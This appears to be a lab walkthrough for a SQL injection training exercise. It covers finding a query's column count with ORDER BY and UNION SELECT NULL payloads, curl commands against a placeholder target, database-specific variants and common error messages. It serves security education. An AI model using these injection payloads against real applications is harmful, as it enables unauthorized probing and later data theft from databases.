# SQL injection UNION attack, determining the number of columns returned by the query — Practitioner

**Status:** Solved

---

## Goal

Use SQL injection to determine the exact number of columns returned by the vulnerable query using UNION-based techniques.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Browse to the shopping application
   - Click on any product category:
```
   GET /filter?category=Gifts
```
   - This parameter is vulnerable to SQL injection

2. **Test for SQL injection**
   - Confirm vulnerability with a basic test:
```
   /filter?category=Gifts'
```
   - You should see an error or unusual behavior

3. **Method 1: ORDER BY technique**
   - Use ORDER BY to determine column count
   - Start with 1 and increment:
```
   Gifts' ORDER BY 1--
   Gifts' ORDER BY 2--
   Gifts' ORDER BY 3--
   Gifts' ORDER BY 4--
   Gifts' ORDER BY 5--
```
   - Continue until you get an error
   - If ORDER BY 3 works but ORDER BY 4 fails → 3 columns

4. **Execute ORDER BY enumeration**
```bash
   curl -s "https://TARGET/filter?category=Gifts'+ORDER+BY+1--"
   curl -s "https://TARGET/filter?category=Gifts'+ORDER+BY+2--"
   curl -s "https://TARGET/filter?category=Gifts'+ORDER+BY+3--"
   curl -s "https://TARGET/filter?category=Gifts'+ORDER+BY+4--"
```
   - Watch for error messages or empty responses

5. **Method 2: UNION SELECT NULL technique**
   - Start with one NULL and add more:
```
   Gifts' UNION SELECT NULL--
   Gifts' UNION SELECT NULL,NULL--
   Gifts' UNION SELECT NULL,NULL,NULL--
   Gifts' UNION SELECT NULL,NULL,NULL,NULL--
```
   - First successful query reveals column count
   - NULL is type-safe (works with any data type)

6. **Execute UNION SELECT enumeration**
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL--"
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,NULL--"
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--"
```
   - Stop when page loads without error

7. **Verify the result**
   - Once you find the correct number, the page loads normally
   - No database errors appear
   - Lab solves automatically when you succeed

---

## Example scenario

Testing with ORDER BY:
```
Gifts' ORDER BY 1--  → Page loads ✓
Gifts' ORDER BY 2--  → Page loads ✓
Gifts' ORDER BY 3--  → Page loads ✓
Gifts' ORDER BY 4--  → Error/No results ✗

Conclusion: 3 columns
```

Confirming with UNION SELECT:
```
Gifts' UNION SELECT NULL--             → Error ✗
Gifts' UNION SELECT NULL,NULL--        → Error ✗
Gifts' UNION SELECT NULL,NULL,NULL--   → Success ✓

Confirmed: 3 columns
```

---

## Understanding each method

**ORDER BY method:**
- **How it works**: Sorts result by column number
- **Pros**: Fast, requires fewer requests
- **Cons**: May be blocked by WAFs, less stealthy
- **When to use**: Quick initial testing
- **Error behavior**: "Unknown column" or similar when number exceeds column count

**UNION SELECT NULL method:**
- **How it works**: Attempts to combine queries with matching columns
- **Pros**: More reliable, type-safe with NULL
- **Cons**: Requires more requests
- **When to use**: When ORDER BY is blocked or for confirmation
- **Error behavior**: "The used SELECT statements have a different number of columns"

---

## Why NULL is important

**NULL advantages:**
- Compatible with ANY data type (string, int, date, etc.)
- Doesn't cause type mismatch errors
- Safe for blind enumeration
- Works across all database systems

**Alternatives (less safe):**
- Using numbers: `UNION SELECT 1,2,3` (fails if column is string)
- Using strings: `UNION SELECT 'a','b','c'` (fails if column is numeric)
- NULL avoids these issues

---

## Database-specific considerations

**Oracle:**
- Must include `FROM dual`:
```
Gifts' UNION SELECT NULL FROM dual--
Gifts' UNION SELECT NULL,NULL FROM dual--
```

**MySQL:**
- Can use `#` for comments:
```
Gifts' ORDER BY 1#
Gifts' UNION SELECT NULL,NULL#
```

**All databases:**
- Standard `--` works universally
- Add space after `--` for safety: `-- ` or use `--+`

---

## Common errors and meanings

| Error Message | Meaning |
|---------------|---------|
| "Unknown column '4' in 'order clause'" | Too many columns in ORDER BY |
| "The used SELECT statements have different number of columns" | UNION column count mismatch |
| "Conversion failed" | Type mismatch (shouldn't happen with NULL) |
| "Syntax error near '--'" | Comment not working, try different syntax |

---

## Tips for success

- Start small and increment (don't jump to high numbers)
- Use consistent comment syntax throughout testing
- If one method is blocked, try the other
- Document your findings (what worked, what didn't)
- Most web apps have 2-10 columns (rarely more)

---

